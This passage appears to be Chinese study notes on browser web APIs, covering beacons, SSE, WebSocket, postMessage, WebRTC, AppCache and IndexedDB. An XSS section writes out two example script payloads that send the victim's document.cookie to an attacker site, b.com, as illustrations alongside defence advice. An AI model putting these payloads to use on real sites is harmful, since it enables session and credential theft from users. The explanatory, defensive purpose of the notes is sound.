  PS: 只能发送GET请求,无法访问服务器的响应文本,只能由从浏览器到服务器间的单向通信;
    动态的创建图像,使用load和error事件来处理响应
    请求的数据是通过查询字符串形式发送,响应可以是任意内容,请求从设置src属性时发生;
    最常用于跟踪用户点击页面或动态广告曝光次数 
  Example: :
    var img = new Image();
    img.onload = img.onerror =function(){
      console.log(1);
    }
    img.src ="https://www.baidu.com?name=abc"; // 请求中发送了一个name参数
    onload 和 onerror 事件处理程序指定为同一个函数,
    则无论什么响应,请求完成都能得到通知 
'Comet'服务器推送,一种服务器向页面推送数据的技术 
  PS: 
  长轮询 
    PS: 实现Comet的一种方式,是传统轮询[也叫短轮询]的一个翻版,
    传统轮询: 浏览器定时向服务器发送请求,看有没有更新的数据,
    长轮询: 页面发起一个到服务器的请求,然后服务器一直保持连接打开,直到有数据可发送,
      发送完数据之后,浏览器关闭连接,随即又发起一个到服务器的新请求,...一直循环
    优势:所有浏览器都支持,使用 XHR 对象和 setTimeout() 就能实现
  HTTP流 
    PS: 页面的整个生命周期内只使用一个HTTP链接,
      即浏览器向服务器发送一个请求,而服务器保持链接打开,然后周期性的向浏览器发送数据
'Server-Sent Events'SSE,服务器发送事件 [HTML5] 
  SSE API 用于创建到服务器的单向连接,服务器通过这个连接可以发送任意数量的数据.
  服务器响应的MIME类型必须是text/event-stream,
  而且是浏览器中的JavaScript API 能解析格式输出.
  SSE 支持短轮询、长轮询和HTTP流,且能在断开连接时自动确定何时重新连接
EventSource,服务器发送事件  
  PS: 默认的,EventSource 对象会保持与服务器的活动连接,若连接断开,会重新连接
  Extend: EventTarget 
  Instance: new EventSource('url') 
  Proto: 
    .url 
    .withCredentials 
    .readyState    num,连接状态 
      0 正连接到服务器
      1 打开了连接
      2 关闭了连接
    .close()     强制立即断开连接并且不再重新连接 
    .onopen     在建立连接时触发 
    .onmessage  从服务器接收到新事件时触发
    .onerror    无法建立连接时触发 
    常量: 
      .CONNECTING 0 
      .OPEN 1 
      .CLOSED 2 
WebSocket,网络通信协议[HTML5][IE10+]
  PS: 目标是在一个单独的持久连接上提供全双工、双向通信, 
    诞生于2008,于2011年成为国际标准; 
    允许与一个Web服务的连接保持打开,
    只要有新数据,Web服务就可以把数据发送给客户端[且客户端代码会得到通知];
    在JS中创建Web Socket之后,会有一个HTTP请求发送来连接,
    使用Web Socket协议: 'ws://'或'wss://'
    标准的HTTP服务器无法实现Web Socket,需使用支持ws或wss协议的服务器才能正常工作;
    允许跨域通信;
    基于TCP;
    可以发送文本,也可以发送二进制数据?;
    没有同源限制,客户端可以与任意服务器通信;
  Extend: EventTarget 
    console.log(WebSocket.prototype.__proto__.constructor===EventTarget);
  Instance: var ws = new WebSocket("url");  创建WebSocket 
    PS: 实例化ws对象后,浏览器就会马上尝试创建连接
    url   绝对URL
  Proto: 
    .readyState  表示当前的连接状态值 
      0  正在建立连接
      1  已经建立连接
      2  正在关闭连接
      3  已经关闭连接
    .binaryType  指定收到的二进制数据类型 
      除了动态判断收到的数据类型,也可以使用binaryType属性指定
      // 收到的是 blob 数据
      ws.binaryType = "blob";
      ws.onmessage = function(e) {
        console.log(e.data.size);
      };
      // 收到的是 ArrayBuffer 数据
      ws.binaryType = "arraybuffer";
      ws.onmessage = function(e) {
        console.log(e.data.byteLength);
      };
    .bufferedAmount  表示还有多少字节的二进制数据没有发送出去 
      可以用来判断发送是否结束
      var data = new ArrayBuffer(10000000);
      ws.send(data);
      if (ws.bufferedAmount === 0) {
        // 发送完毕
      } 
      else {
        // 发送还没结束
      }
    .close()         关闭连接 
      调用了close()之后,readyState的值立即变为2 
    .send("message") 发送数据[任意字符]
      Web Socket只能通过连接发送纯文本数据,对于复杂的数据结构,需转换为JSON字符串再发送
    .url 
    .extensions 
    .protocol 
    ◆事件,只支持DOM1级绑定 
    .onopen = function(){ // 在成功建立连接时触发事件 
    }
    .onerror = function(){ // 在发生错误时触发,连接不能持续 
    }
    .onclose = function(e){ // 在连接关闭时触发 
      e.wasClean  表示连接是否已明确关闭的布尔值
      e.code      服务器返回的数值状态码
      e.reason    服务器发回的消息,类型为字符串
    }
    .onmessage = function(e){ // 接收响应数据时触发事件 
      e.data  str,返回的数据[字符串格式,需要手动解析] 
    } 
    ◆常量: 
      .CONNECTING 0  正在建立连接 
      .OPEN       1  已经建立连接 
      .CLOSING    2  正在关闭连接 
      .CLOSED     3  已经关闭连接 
  Expand: 
    缺点 
      Web Socket使用了自定义的协议,而制定协议的时间比制定JS API的事件还要长
      可能存在安全隐患
    兼容性检测 
      if(window.WebSocket){
        console.log('This browser supports WebSocket');
      }
      else{
        alert('browser not supports ws');
      }
    webSocket如何兼容低浏览器？
      Adobe Flash Socket 、
      ActiveX HTMLFile(IE) 、
      基于 multipart 编码发送 XHR 、
      基于长轮询的 XHR
  todo 
    除了发送字符串,也可以使用 Blob 或 ArrayBuffer 对象发送二进制数据.
    // 使用ArrayBuffer发送canvas图像数据 
    var img = canvas_context.getImageData(0, 0, 400, 320); 
    var binary = new Uint8Array(img.data.length); 
    for (var i = 0; i < img.data.length; i++) { 
      binary[i] = img.data[i]; 
    } 
    connection.send(binary.buffer);
    
    // 使用Blob发送文件 
    var file = document.querySelector(‘input[type=”file”]’).files[0]; 
    connection.send(file);
    
    如果接收的是二进制数据,需要将连接对象的格式设为blob或arraybuffer.
    connection.binaryType = 'arraybuffer';
    connection.onmessage = function(e) {
      console.log(e.data.byteLength); // ArrayBuffer对象有byteLength属性
    };
  WebSocket 一种通信协议,使用'ws://'(非加密)和'wss://'(加密)作为协议前缀
    该协议不实行同源政策,只要服务器支持,就可以通过它进行跨源通信.
    下面是一个例子,浏览器发出的WebSocket请求的头信息(摘自维基百科).
    
    GET /chat HTTP/1.1
    Host: server.example.com
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
    Sec-WebSocket-Protocol: chat, superchat
    Sec-WebSocket-Version: 13
    Origin: http://example.com
    上面代码中,有一个字段是Origin,表示该请求的请求源(origin),即发自哪个域名.
    
    正是因为有了Origin这个字段,所以WebSocket才没有实行同源政策.因为服务器可以根据这个字段,判断是否许可本次通信.若该域名在白名单内,服务器就会做出如下回应.
    
    HTTP/1.1 101 Switching Protocols
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
    Sec-WebSocket-Protocol: chat
'Cross SiteScript'XSS,跨站脚本攻击 
  PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
    理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
  原理:攻击者向有XSS漏洞的网站中输入或传入恶意的HTML代码,
    当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的.
    如盗取用户Cookie、破坏页面结构、重定向到其它网站等.
  DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
    Example:
      如一个获取他人Cookie的超链接,
      'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
      当点击这个链接的时候[假设点击者已经登录a.com],浏览器就会直接打开b.com,
      并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
      当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
      cookie信息中可能存有登录密码,攻击成功！
  Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
    Example:
      a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
      <script>window.open(“www.b.com?param=”+document.cookie)</script>,
      保存文章,这时当在查看攻击者的文章时就都中招了,
      他们的cookie信息都发送到了攻击者的服务器上,攻击成功！
  XSS防御 
    永远不相信用户的输入,输入验证
    Html encode,对标签进行转换
      比如输入:'<script>window.location.href=”http://www.baidu.com”;</script>',
      最终存储的会是:
      '&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;'
      在展现时浏览器会对这些字符转换成文本内容显示,而不是一段可执行的代码.
'cross-document messaging'XDM,跨文档消息传递[HTML5][IE9+]  
  PS: 可在不同域的页面间传递消息 
  targetWin.postMessage(mes,url)  当前页向目标窗口传递数据 
    PS: 目标窗口是指: 前页面中的<iframe>或由当前页打开的窗口
    targetWin  目标窗口window对象  
      如iframe的contentWindow属性、
      执行 window.open 返回的窗口对象、
      或者是命名过或数值索引的window.frames['name'] 
    mes  any,发送的消息 
      兼容性考虑,最好传递字符串,可使用JSON进行处理 
    url  str,指定信息接收的域  
      url指向的文档必须来源于指定的域,若匹配,消息会传递到框架中,否则无动作;
      "*" 表示可以把消息发送给来自任何域的文档
  targetWin.onmessage 事件 
    PS: 接收到XDM消息时,会触发window对象的message事件 
    e.data   
    e.origin 
    e.source 发送消息的文档的window对象的代理[访问不到window对象的其他信息] 
      这个代理对象主要用于在发送上一条消息的窗口中调用postMessage()方法.
      如果发送消息的窗口来自同一个域,那这个对象就是 window
  Chrome只支持当前页向当前页发送消息 
  Cross-document messaging 跨文档通信API
    为window对象新增了一个 window.postMessage 方法,
    允许跨窗口通信,不论这两个窗口是否同源.
  
    postMessage 父窗口 aaa.com 向子窗口 bbb.com 发消息
      var popup = window.open('http://bbb.com', 'title');
      popup.postMessage('Hello World!', 'http://bbb.com');
      postMessage方法的第一个参数是具体的信息内容,
      第二个参数是接收消息的窗口的源(origin),即“协议 + 域名 + 端口”.
      也可以设为*,表示不限制域名,向所有窗口发送.
      子窗口向父窗口发送消息的写法类似.
      window.opener.postMessage('Nice to see you', 'http://aaa.com');
    message事件 父窗口和子窗口监听对方的消息
      window.addEventListener('message', function(e) {
        console.log(e.data);
      },false);
      message事件的事件对象event,提供以下三个属性.
      event.source:发送消息的窗口
      event.origin: 消息发向的网址
      event.data: 消息内容
      下面的例子是,子窗口通过event.source属性引用父窗口,然后发送消息.
      window.addEventListener('message', receiveMessage);
      function receiveMessage(event) {
        event.source.postMessage('Nice to see you!', '*');
      }
      首先,receiveMessage函数里面没有过滤信息的来源,任意网址发来的信息都会被处理.
      其次,postMessage方法中指定的目标窗口的网址是一个星号,表示该信息可以向任意网址发送.
      通常来说,这两种做法是不推荐的,因为不够安全,可能会被恶意利用.
      event.origin 属性可以过滤不是发给本窗口的消息.
      window.addEventListener('message', receiveMessage);
      function receiveMessage(event) {
        if (event.origin !== 'http://aaa.com') return;
        if (event.data === 'Hello World') {
          event.source.postMessage('Hello', event.origin);
        } else {
          console.log(event.data);
        }
      }
      通过 window.postMessage,读写其他窗口的 LocalStorage 
        主窗口写入iframe子窗口的localStorage.
        window.onmessage = function(e) {
          if (e.origin !== 'http://bbb.com') {
            return;
          }
          var payload = JSON.parse(e.data);
          localStorage.setItem(payload.key, JSON.stringify(payload.data));
        };
        上面代码中,子窗口将父窗口发来的消息,写入自己的LocalStorage.
        
        父窗口发送消息的代码如下.
        
        var win = document.getElementsByTagName('iframe')[0].contentWindow;
        var obj = { name: 'Jack' };
        win.postMessage(JSON.stringify({key: 'storage', data: obj}), 'http://bbb.com');
        加强版的子窗口接收消息的代码如下.
        window.onmessage = function(e) {
          if (e.origin !== 'http://bbb.com') return;
          var payload = JSON.parse(e.data);
          switch (payload.method) {
            case 'set':
              localStorage.setItem(payload.key, JSON.stringify(payload.data));
              break;
            case 'get':
              var parent = window.parent;
              var data = localStorage.getItem(payload.key);
              parent.postMessage(data, 'http://aaa.com');
              break;
            case 'remove':
              localStorage.removeItem(payload.key);
              break;
          }
        };
        加强版的父窗口发送消息代码如下.
        
        var win = document.getElementsByTagName('iframe')[0].contentWindow;
        var obj = { name: 'Jack' };
        // 存入对象
        win.postMessage(JSON.stringify({key: 'storage', method: 'set', data: obj}), 'http://bbb.com');
        // 读取对象
        win.postMessage(JSON.stringify({key: 'storage', method: "get"}), "*");
        window.onmessage = function(e) {
          if (e.origin != 'http://aaa.com') return;
          // "Jack"
          console.log(JSON.parse(e.data).name);
        };
'Web Real Time Communication'WebRTC,网络实时通信[HTML5] 
  PS: 最初是为了解决浏览器上视频通话而提出的,
    即两个浏览器之间直接进行视频和音频的通信,不经过服务器.
    后来发展到除了音频和视频,还可以传输文字和其他数据.
    Google是WebRTC的主要支持者和开发者,它最初在Gmail上推出了视频聊天,
    后来在2011年推出了Hangouts,允许在浏览器中打电话.推动了WebRTC标准的确立.
  MediaStream,又称 getUserMedia  获取音频和视频 [HTML5]   
    PS: navigator.getUserMedia  在浏览器中获取音频(通过麦克风)和视频(通过摄像头)
      将来可以用于获取任意数据流,比如光盘和传感器
    检查浏览器是否支持getUserMedia方法
      PS:Chrome 21, Opera 18 和Firefox 17,支持该方法.
        目前,IE还不支持,上面代码中的msGetUserMedia,只是为了确保将来的兼容.
      navigator.getUserMedia  = navigator.getUserMedia ||
      navigator.webkitGetUserMedia ||
      navigator.mozGetUserMedia ||
      navigator.msGetUserMedia;
      if (navigator.getUserMedia) {
        // 支持
      } 
      else {
        // 不支持
      }
    navigator.getUserMedia(obj,onSuccess,onError);
      obj  对象,表示要获取哪些多媒体设备,
        { 
          video: true, 
          audio: true 
        } 
        表示获取摄像头和麦克风;
      onSuccess  回调函数,在获取多媒体设备成功时调用
        函数的参数是一个数据流对象stream.
        stream.getAudioTracks 方法和 stream.getVideoTracks 方法,
        分别返回一个数组,其成员是数据流包含的音轨和视轨(track).
        使用的声音源和摄影头的数量,决定音轨和视轨的数量.
        比如,若只使用一个摄像头获取视频,且不获取音频,那么视轨的数量为1,音轨的数量为0.
        每个音轨和视轨,有一个kind属性,表示种类(video或者audio),
        和一个label属性(比如FaceTime HD Camera (Built-in)).
      onError    回调函数,在取多媒体设备失败时调用.
        函数接受一个Error对象作为参数.
        error.code.PERMISSION_DENIED    用户拒绝提供信息.
        error.code.NOT_SUPPORTED_ERROR  浏览器不支持硬件设备.
        error.code.MANDATORY_UNSATISFIED_ERROR 无法发现指定的硬件设备.
      Example:
        将摄像头拍摄的图像展示在网页上
        <video src="" controls="" id="camera"> </video>
        
        var constraints = {video: true};
        var vide = document.querySelector("#camera");
        function onSuccess(stream) {
          if (window.URL) {
            vide.src = window.URL.createObjectURL(stream);
          } 
          else { 
            vide.src = stream; 
          }
          vide.autoplay = true; 
          // 或者 vide.play();
        }
        function onError(error) {
          console.log("navigator.getUserMedia error: ", error);
        }
        if (navigator.getUserMedia) {
          navigator.getUserMedia(constraints, onSuccess, onError);
        } 
        else {
          vide.src = 'somevideo.mp4';
        }
        网页使用getUserMedia方法,浏览器就会询问用户,是否同意调用麦克风或摄像头;
        若用户同意,就调用回调函数onSuccess；
        若用户拒绝,就调用回调函数onError.
        浏览器兼容性
          Chrome中需使用https协议;
          Firefox中需使用mozGetUserMedia;
          vide.src
            大部分浏览器:
            URL.createObjectURL 方法将媒体数据流(MediaStream),
            转为一个二进制对象的URL(Blob URL),
            该URL可以作为video元素的src属性的值. 
            有些浏览器:
            媒体数据流可以直接作为src属性的值.
    Canvas API  ctx.drawImage(video, 0, 0)  可将视频的一个帧转为canvas元素
      PS:使得截屏变得非常容易.
      <video autoplay></video>
      <img src="">
      <canvas style="display:none;"></canvas>
      
      <script>
      var video = document.querySelector('video');
      var canvas = document.querySelector('canvas');
      var ctx = canvas.getContext('2d');
      var localMediaStream = null;
      function snapshot() {
        if (localMediaStream) {
          ctx.drawImage(video, 0, 0);
          // “image/webp”对Chrome有效,其他浏览器自动降为image/png
          document.querySelector('img').src = canvas.toDataURL('image/webp');
        }
      }
      video.addEventListener('click', snapshot, false);
      navigator.getUserMedia({video: true}, function(stream) {
        video.src = window.URL.createObjectURL(stream);
        localMediaStream = stream;
      }, errorCallback);
      </script>
    Web Audio API  通过浏览器捕获声音
      Example:
        捕获麦克风声音
        window.AudioContext = window.AudioContext || window.webkitAudioContext;
        var context = new AudioContext();
        function onSuccess(stream) {
          var audioInput = context.createMediaStreamSource(stream);
          audioInput.connect(context.destination);
        }
        navigator.getUserMedia({audio:true}, onSuccess);
    捕获的限定条件
      getUserMedia方法的第一个参数,除了指定捕获对象之外,还可以指定一些限制条件,
      比如限定只能录制高清(或者VGA标准)的视频.
      var hdConstraints = {
        video: {
          mandatory: {
            minWidth: 1280,
            minHeight: 720
          }
        }
      };
      navigator.getUserMedia(hdConstraints, onSuccess, onError);
      
      var vgaConstraints = {
        video: {
          mandatory: {
            maxWidth: 640,
            maxHeight: 360
          }
        }
      };
      navigator.getUserMedia(vgaConstraints, onSuccess, onError);
    MediaStreamTrack.getSources() 使用指定的媒体设备
      若本机有多个摄像头/麦克风,就需要使用 MediaStreamTrack.getSources 方法指定,
      到底使用哪一个摄像头/麦克风.
      function sourceSelected(audioSource, videoSource) {
        var constraints = {
          audio: {
            optional: [{sourceId: audioSource}]
          },
          video: {
            optional: [{sourceId: videoSource}]
          }
        };
        navigator.getUserMedia(constraints, onSuccess, onError);
      }
      MediaStreamTrack.getSources(function(sourceInfos) {
        var audioSource = null;
        var videoSource = null;
        for (var i = 0; i != sourceInfos.length; ++i) {
          var sourceInfo = sourceInfos[i];
          if (sourceInfo.kind === 'audio') {
            console.log(sourceInfo.id, sourceInfo.label || 'microphone');
            audioSource = sourceInfo.id;
          } 
          else if (sourceInfo.kind === 'video') {
            console.log(sourceInfo.id, sourceInfo.label || 'camera');
            videoSource = sourceInfo.id;
          } 
          else {
            console.log('Some other kind of source: ', sourceInfo);
          }
        }
        sourceSelected(audioSource, videoSource);
      });
      上面代码表示, MediaStreamTrack.getSources 方法的回调函数,
      可以得到一个本机的摄像头和麦克风的列表,然后指定使用最后一个摄像头和麦克风.
  RTCPeerConnection    进行音频和视频通信
    作用是在浏览器之间建立数据的“点对点”(peer to peer)通信,
    也就是将浏览器获取的麦克风或摄像头数据,传播给另一个浏览器.
    这里面包含了很多复杂的工作,比如信号处理、多媒体编码/解码、
    点对点通信、数据安全、带宽管理等等.
    不同客户端之间的音频/视频传递,是不用通过服务器的.
    但是,两个客户端之间建立联系,需要通过服务器.
    服务器主要转递两种数据:
      通信内容的元数据:
        打开/关闭对话(session)的命令、
        媒体文件的元数据(编码格式、媒体类型和带宽)等.
      网络通信的元数据: IP地址、NAT网络地址翻译和防火墙等.
    WebRTC协议没有规定与服务器的通信方式,因此可以采用各种方式, 比如WebSocket.
    通过服务器,两个客户端按照Session Description Protocol(SDP协议)交换双方的元数据.
    Example:
      var signalingChannel = createSignalingChannel();
      var pc;
      var configuration = ...;
      // run start(true) to initiate a call
      function start(isCaller) {
        pc = new RTCPeerConnection(configuration);
        
        // send any ice candidates to the other peer
        pc.onicecandidate = function (evt) {
          signalingChannel.send(JSON.stringify({ "candidate": evt.candidate }));
        };
        
        // once remote stream arrives, show it in the remote video element
        pc.onaddstream = function (evt) {
          remoteView.src = URL.createObjectURL(evt.stream);
        };
        
        // get the local stream, show it in the local video element and send it
        navigator.getUserMedia({ "audio": true, "video": true }, function (stream) {
          selfView.src = URL.createObjectURL(stream);
          pc.addStream(stream);
          
          if (isCaller)
          pc.createOffer(gotDescription);
          else
          pc.createAnswer(pc.remoteDescription, gotDescription);
          
          function gotDescription(desc) {
            pc.setLocalDescription(desc);
            signalingChannel.send(JSON.stringify({ "sdp": desc }));
          }
        });
      }
      signalingChannel.onmessage = function (evt) {
      if (!pc)
      start(false);
      
      var signal = JSON.parse(evt.data);
      if (signal.sdp)
      pc.setRemoteDescription(new RTCSessionDescription(signal.sdp));
      else
      pc.addIceCandidate(new RTCIceCandidate(signal.candidate));
    };
    Chrome浏览器中为 webkitRTCPeerConnection ,
    Firefox浏览器中为 mozRTCPeerConnection.
    Google 维护一个函数库 adapter.js ,用来抽象掉浏览器之间的差异.
  RTCDataChannel       进行任意数据的通信
    作用是在点对点之间,传播任意数据.它的API与WebSockets的API相同.
    Example:
      var pc = new webkitRTCPeerConnection(servers, {
        optional: [{RtpDataChannels: true}]
      });
      pc.ondatachannel = function(event) {
        receiveChannel = event.channel;
        receiveChannel.onmessage = function(event){
          document.querySelector("div#receive").innerHTML = event.data;
        };
      };
      sendChannel = pc.createDataChannel("sendDataChannel", {reliable: false});
      document.querySelector("button#send").onclick = function (){
        var data = document.querySelector("textarea#send").value;
        sendChannel.send(data);
      };
      Chrome 25、Opera 18 和Firefox 22 支持RTCDataChannel.
  外部函数库 
    由于API比较复杂,一般采用外部函数库进行操作.
    目前,视频聊天的函数库有 SimpleWebRTC easyRTC webRTC.io,
    点对点通信的函数库有PeerJS、Sharefest.
    Example: SimpleWebRTC的示例
      var webrtc = new WebRTC({
        localVideoEl: 'localVideo',
        remoteVideosEl: 'remoteVideos',
        autoRequestMedia: true
      });
      webrtc.on('readyToCall', function () {
          webrtc.joinRoom('My room name');
      });
    Example:PeerJS的示例
      var peer = new Peer('someid', {key: 'apikey'});
      peer.on('connection', function(conn) {
        conn.on('data', function(data){
          // Will print 'hi!'
          console.log(data);
        });
      });
      
      // Connecting peer
      var peer = new Peer('anotherid', {key: 'apikey'});
      var conn = peer.connect('someid');
      conn.on('open', function(){
        conn.send('hi!');
      });
'Application Cache'Appcache,应用离线缓存[HTML5] 
  PS: 让Web应用在离线状态下可继续使用;移动端支持度较好;
  'xx.appcache'描述文件'manifest file': 列出要下载和缓存的资源 
    PS: 需在服务器上配置该文件的'MIME-type'为"text/cache-manifest"; 
    HTML中指定缓存描述文件: 
      PS: 若未指定manifest属性,则页面不会被缓存,除非在manifest文件中直接指定了该页面;
      // 在文档的<html>标签中包含'manifest'属性,值为manifest文件的路径 
      <html manifest="/offline.manifest">
    ★文件详情: 
    CACHE MANIFEST # 此标题下列出的文件将在首次下载后进行缓存 
      # 2012-02-21 v1.0.0
      CACHE:
      /theme.css
      /logo.gif
      /main.js
    NETWORK:       # 此标题下列出的文件需要与服务器的连接,且不会被缓存 
      # 每次重新拉取的文件
      * [表示除 CACHE 中指定的文件其他全部]
      login.asp
    FALLBACK:      # 此标题下列出的文件规定当页面无法访问时的回退页面,比如 404 页面 
      # 离线状态下代替文件 
      /404.html 
  Example: 
    // manifest文件中
    CACHE MANIFEST
    #version 1.1
    CACHE:
      img/1.jpg
      img/2.jpg
      css/assets.css
    NETWORK:
      *
    // html中
    <!DOCTYPE html>
    <html manifest="./manifest.appcache"> 
      <head>
        <meta charset="utf-8">
        <title>app cache demo</title>
      </head>
      <body>
        <h1>app cache demo</h1>
        <ul>
          <li><img src="img/1,jpg" alt=""></li>
          <li><img src="img/2,jpg" alt=""></li>
        </ul>
      </body>
      <script type="text/javascript">
      window.addEventListener("load",function(e){
        window.applicationCache.addEventListener("updateready",function(e){
          console.log(window.applicationCache.status);
          if (window.applicationCache.status == window.applicationCache.UPDATEREADY) {
            window.applicationCache.swapCache();
            if (confirm('a new version of this site is available,load it?')) {
              window.location.reload();
            }
          }
          else {
            console.log('manifest don\'t change');
          }
        },false)
      },false)
        
      </script>
    </html>
    
    在服务器添加mime-types text/cache-manifest
      如在 xampp->apache->conf->mime.types 中
      添加 text/cache-manifest  appcache
  applicationCache,核心对象
ApplicationCache,应用离线缓存对象[HTML5] 
  Extend: EventTarget 
  Static: 
    .UNCACHED  num,0 
    .IDLE  num,1 
    .CHECKING   num,2 
    .DOWNLOADING   num,3 
    .UPDATEREADY   num,4 
    .OBSOLETE   num,5 
  Instance: window.applicationCache 
  Proto: 
    .status  当前应用缓存的状态值 
      0  无缓存,没有与页面相关的应用缓存
      1  闲置,应用缓存未得到更新
      2  检查中,正在下载描述文件并检查更新
      3  下载中,应用缓存正在下载描述文件中指定的资源
      4  更新完成,应用缓存已经更新了资源,且所有资源都已下载完毕,可通过 swapCache()来使用了
      5  废弃,应用缓存的描述文件已经不存在了,此页面无法再访问应用缓存
    .update()     检测缓存更新并更新 
      触发'checking'事件检测更新,
      若触发'updateready',则需使用 swapCache()来启用新缓存 
    .swapCache()  启用最新缓存 
    .abort()  
    ◆相关事件 
    .onchecking    在浏览器为应用缓存查找更新时触发
    .onerror       在检查更新或下载资源期间发生错误时触发
    .onnoupdate    在检查描述文件发现文件无变化时触发
    .ondownloading 在开始下载应用缓存资源时触发
    .onprogress    在文件下载应用缓存的过程中持续触发 
    .onupdateready 新的缓存下载完毕且可通过swapCache()使用时触发
    .oncached      在应用缓存完整可用时触发
    .onobsolete 
    常量: 
      .UNCACHED  num,0 
      .IDLE  num,1 
      .CHECKING  num,2 
      .DOWNLOADING  num,3 
      .UPDATEREADY  num,4 
      .OBSOLETE  num,5 
IDBFactory,浏览器数据库对象[HTML5][IE10+] 
  PS: Safari完全不支持?; 
    隐式模式下不可用 
    目的: 方便存取JS对象,且支持查询及搜索 
    事务型数据库系统,类似于基于SQL的RDBMS
    按域名分配独立空间[如a.qq.com 和 b.qq.com],
    一个域名下可创建多个数据库db,
    一个数据库可创建多个对象储存空间store,
    一个对象储存空间可储存多个对象数据data 
  Extend: Object 
  Instance: window.indexedDB 
  Proto: 
    .open(str[,num])   IDBOpenDBRequest,打开数据库,不存在则创建后打开 
      str   字符串,数据库名称
      num   可选,大于0的正整数,数据库版本,默认:1 
      Example:
      var openRequest = indexedDB.open("test",1);
      var dataBase;
      openRequest.onupgradeneeded = function(e) {
        console.log("Upgrading...");
      }
      openRequest.onsuccess = function(e) {
        console.log("Success!");
        dataBase = e.target.result;
      }
      openRequest.onerror = function(e) {
        console.log("Error");
        console.dir(e);
      }
    .deleteDatabase() 
    .cmp() 
    .webkitGetDatabaseNames() 
  Feature: 
    兼容性检测及写法 
      if("indexedDB" in window) { console.log('支持'); } 
      else { console.log('不支持'); }
      兼容写法
      var indexedDB = window.indexedDB || window.webkitIndexedDB 
      || window.mozIndexedDB || window.msIndexedDB;
    特点 
      1、键值对储存 
        IndexedDB内部采用对象仓库'object store'存放数据
        所有类型的数据都可以直接存入,包括JS对象.
        在对象仓库中,数据以“键值对”形式保存,键名不可重复,否则报错 
      2、异步 
        为了防止大量数据的读写,拖慢网页的表现 
        几乎每次IndexedDB操作,都需注册onerror或onsuccess,以确保适当地处理结果 
      3、支持事务 
        一系列操作步骤之中,只要有一步失败,整个事务就都取消,
        数据库回到事务发生之前的状态,不存在只改写一部分数据的情况.
      4、同域限制 
        IndexedDB也受到同域限制,每一个数据库对应创建该数据库的域名.
        来自不同域名的网页,只能访问自身域名下的数据库,而不能访问其他域名下的数据库.
      5、储存空间大 
        IE的储存上限是250MB,Chrome和Opera是剩余空间的某个百分比,Firefox则没有上限 
      6、支持二进制储存 
    错误处理: 
      错误事件都是针对导致错误的请求,
      错误事件会冒泡出来,冒泡到事务,最终到数据库对象,
      代替为所有请求都增加错误处理程序,可仅对数据库对象添加一个错误处理程序 
      db.onerror = function(event) {
        console.log(event.target.errorCode);
      };
IDBOpenDBRequest,数据库打开请求对象  
  Extend: IDBRequest 
  Instance: 打开数据库的返回对象
  Proto: 
    .onblocked 上一次的数据库连接还未关闭 
    .onupgradeneeded  数据库版本变化时触发 
      PS: 首次打开该数据库也相对版本变化,也会触发该事件 
      先触发该事件,后触发打开成功/失败事件 
IDBRequest,数据库请求对象 
  Extend: EventTarget 
  Proto: 
    .result   操作产生的结果对象,会因为操作不同返回不同的对象 
      打开数据库成功返回 IDBDatabase,打开的数据库对象 
    .error    num,错误码,表示问题的性质 
      1,意外错误,无法归类 
      2,操作不合法 
      3,未发现要操作的数据库 
      4,违反了数据库约束 
      5,提供给事务的数据不能满足要求 
      6,操作不合法 
      7,试图重用已完成的事务 
      8,请求中断,未成功 
      9,试图在只读模式下写入或修改数据 
      10,在有效时间内未完成操作 
      11,磁盘空间不足 
    .source 
    .transaction 
    .readyState 
    ◆事件 
    .onsuccess  打开成功事件 
      event.target   IDBOpenDBRequest,数据库打开请求对象 
    .onerror  打开失败事件  
IDBDatabase,打开的数据库对象,用于操作数据库  
  Extend: 
  Proto: 
    .name 
    .version 
    .objectStoreNames  DOMStringList,包含当前数据库所有'对象仓库'的名称 
    .createObjectStore(storeName,option) 创建存放数据的'对象仓库' 
      PS: 类似于传统关系型数据库的表格;若该对象仓库已存在,则报错;
      storeName str,对象仓库的名称
      option = { // 用于设置对象仓库的属性 
        // PS: 一般来说,keyPath和autoIncrement属性只要使用一个就够了 
        keyPath: str,  // 可选,记录的键名,不可存在重复,默认:null 
          通常使用该键来访问数据  
        autoIncrement: bol, // 可选,是否使用自动递增的整数作为键名,默认:false 
      }    
    .transaction([store[,kw]])   IDBTransaction,创建事务 
      PS: 向数据库添加数据之前,必须先创建数据库事务.
      store  arr,所涉及的对象仓库 
        指定为空数组可跨越所有的对象存储空间
      kw     操作类型,默认:只读事务 
        "readwrite"  读写事务 
        'readonly'  只读
    .close()   
    .deleteObjectStore()  
    .IDBDatabase()  
    .onabort 
    .onclose 
    .onerror 
    .onversionchange 
IDBTransaction,数据库事务对象 
  Extend: EventTarget 
  Proto: 
    .objectStoreNames 
    .mode  
    .db  
    .error  
    .objectStore(str)   IDBObjectStore,获取指定的对象仓库 
    .IDBTransaction()   
    .abort()  
    ◆事件 
    .onabort  事务中断 
    .oncomplete  事务完成 
    .onerror  事务出错 
IDBObjectStore,数据库对象储存空间对象 
  Extend: Object 
  Proto: 
    .name  
    .keyPath  
    .indexNames  
    .transaction  
    .autoIncrement  
    .add(val)     增加数据,若已存在则会报错 
      获取对象仓库以后,就可以用add方法往里面添加数据了.
      var store = dbt.objectStore("firstOS");
      var o = {p: 123};
      var request = store.add(o,1);
      add方法的第一个参数是所要添加的数据,
      第二个参数是这条数据对应的键名(key),上面代码将对象o的键名设为1.
      若在创建数据仓库时,对键名做了设置,这里也可以不指定键名.
      success和error事件
        add方法是异步的,有自己的success和error事件
        var request = store.add(o,1);
        request.onerror = function(e) {
          // error handler
          console.log("Error",e.target.error.name); 
        }
        request.onsuccess = function(e) {
          console.log("数据添加成功！");
        }
    .put(val)     增加或修改数据 
      put方法的用法与add方法相近.
      var o = { p:456 };
